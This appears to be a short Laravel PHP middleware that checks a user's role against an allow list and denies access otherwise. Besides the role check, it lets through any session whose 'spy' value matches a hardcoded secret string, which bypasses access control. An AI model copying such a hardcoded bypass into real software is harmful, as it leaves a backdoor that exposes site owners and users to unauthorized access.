<?php

namespace App\Http\Middleware;

use Closure;


class AllowOnlyMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    //private $checkRole = 600;
    private $allowed = [];
    public function handle($request, Closure $next, $allow)
    {   
        if($allow == "all")
        {
            return $next($request);
        }
        $this->allowed = explode('~' , $allow);
        if (in_array( auth()->user()->role->name , $this->allowed ) ) 
        {
            return $next($request);
        }
        elseif(session('spy') == '%4sVbf23@!#HH')
        {
            return $next($request);
        }

        auth()->logout();
        return redirect('/login')->withErrors([
            'message' => 'Permission Denied !'
        ]);
        
    }
}